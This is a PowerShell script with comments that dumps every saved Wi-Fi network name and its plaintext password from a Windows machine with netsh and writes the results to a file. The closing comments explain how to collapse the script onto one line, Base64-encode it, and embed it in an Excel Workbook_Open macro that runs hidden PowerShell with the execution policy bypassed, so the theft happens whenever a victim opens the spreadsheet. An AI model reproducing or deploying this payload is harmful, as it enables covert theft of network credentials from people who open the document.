# output runs netsh.exe to get all of the wlan profiles on the box
$output  = netsh.exe wlan show profiles

# greps for each line with an essid in it
# NOTE: Might need to edit this section for boxes with multiple users
# "All User Profile" might omit some essid:passwd for certain machines
# need further testing to check
$ssidProfiles = $output | Select-String -Pattern 'All User Profile' -AllMatches

# splits and trims to get just the essid
$ssidNetwork = ($ssidProfiles -split ":").Trim() | % {

    # for each essid reruns netsh.exe to get the plaintext password 
    if ($_ -ne 'All User Profile'){ 
        $getPW =  netsh.exe wlan show profiles name="$_" key=clear
        $pw = $getPW | Select-String -Pattern 'Key Content'

        # splits and trims to get just the password
        $splitPW = ($pw -split ":")[-1].Trim()

        # echos the essid : password to the object
        echo "$_ : $splitPW"
    }
}

# writes object to file
# NOTE: must use an absolute path to a directory with write permissions
# if you use relative path the write will fail due to the $pwd being
# the path that PowerShell is installed in.
$ssidNetwork | Out-File C:\absolute\path to\results.txt

# in order to convert to BASE64 and have the code execute correctly
# it must be writtent to one line using ";" after each line
# example as follows
# $output  = netsh.exe wlan show profiles; $ssidProfiles = $output | Select-String -Pattern 'All User Profile' -AllMatches; $ssidNetwork = ($ssidProfiles -split ":").Trim() | % { if ($_ -ne 'All User Profile'){ $getPW =  netsh.exe wlan show profiles name="$_" key=clear; $pw = $getPW | Select-String -Pattern 'Key Content'; $splitPW = ($pw -split ":")[-1].Trim(); echo "$_ : $splitPW"}  }; $ssidNetwork | Out-File D:\foxterrier\ideal-alligator\results.txt

# below is the code to convert read the file with the single line command
# and convert it to BASE64 and write the output to a file

# $text = Get-Content path\to\powershellScript.ps1
# $bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
# $encoded = [Convert]::ToBase64String($bytes)
# $encoded > path\to\outputFile.txt

## macro should look like this: ##
#
## makes the function run on open ##
# Private Sub Workbook_Open()
#
#     strCmd = "powershell.exe -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass" & _
#          "-EncondedCommand ***enterBASE64 endcoded command here**"
#
## Defines Obj ##
#     Dim WshShell
#
#     Set WshShell = CreateObject("WScript.Shell")
#     Set WshShellExec = WshShell.Exec(strCmd)
#
# End Sub